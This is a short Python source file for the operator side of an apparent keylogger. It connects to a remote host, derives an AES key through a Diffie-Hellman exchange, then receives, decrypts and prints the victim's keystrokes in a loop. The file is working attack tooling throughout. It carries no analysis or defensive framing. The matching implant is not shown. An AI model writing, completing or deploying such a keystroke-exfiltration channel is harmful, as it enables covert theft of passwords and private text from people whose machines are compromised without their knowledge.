from packet import *
from dhaes import *
import json
import socket

def attacker_socket(ADDRESS: tuple,):
    AttackerSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    AttackerSocket.connect(ADDRESS)
    
    KEY = gen_key_dh(AttackerSocket)

    try:
        while True:
            try:
                keystroke_packet = receive_packet(AttackerSocket)
                nonce = keystroke_packet.get_header(False)
                keystroke = DecryptAES(KEY, nonce, keystroke_packet.get_data(False))
                print(keystroke)

            except ValueError as e:
                print(e)

    except KeyboardInterrupt:
         AttackerSocket.close()
                 
def gen_key_dh(AttackerSocket: socket.socket) -> bytes:
    '''
    Gets modp from 8192-bit.txt, and execute the Diffie-Hellman key exchange.
    returns an AES key based off the SharedSecret.

    For more clearance, see https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange
    '''
    with open(f"8192-bit.txt",'r') as p_file:
        p = p_file.readlines()
    stripped_lines = [line.strip('\n') for line in p]
    modp = int("".join(stripped_lines),16)

    a = rand() 
    A = PublicKey(2,a,modp)
    pgA = { 'p' : modp, 'g' : 2 , 'A': A}

    B = send_pgA(pgA,AttackerSocket)
    K = SharedSecret(B,a,pgA['p'])
    Kb = str(K).encode('utf-8')

    return key_AES(Kb)

def send_pgA(pgA: dict, AttackerSocket: socket.socket) -> int:
    '''
    Sends modp, generator and A.

    Returns B from the listener.
    '''

    pgA_Packet = Packet("PGAX",json.dumps(pgA))
    AttackerSocket.sendall(pgA_Packet.raw_packet())

    B = receive_packet(AttackerSocket)
    B = int(B.data)
    return B